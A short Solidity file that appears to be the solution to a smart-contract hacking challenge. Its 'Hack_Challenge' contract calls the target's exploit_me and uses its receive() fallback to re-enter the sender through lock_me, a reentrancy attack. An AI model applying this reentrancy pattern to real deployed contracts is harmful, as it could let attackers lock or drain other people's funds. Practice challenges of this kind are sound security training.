// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IChallenge {
    function exploit_me(string memory _name) external;

    function lock_me() external;

    function pause(bool _status) external;

    function getAllwiners() external view returns (string[] memory _names);
}

contract Hack_Challenge {
    function exploit(address _addr, string memory _name) public {
        IChallenge(_addr).exploit_me(_name);
    }

    receive() external payable {
        IChallenge(msg.sender).lock_me();
    }
}
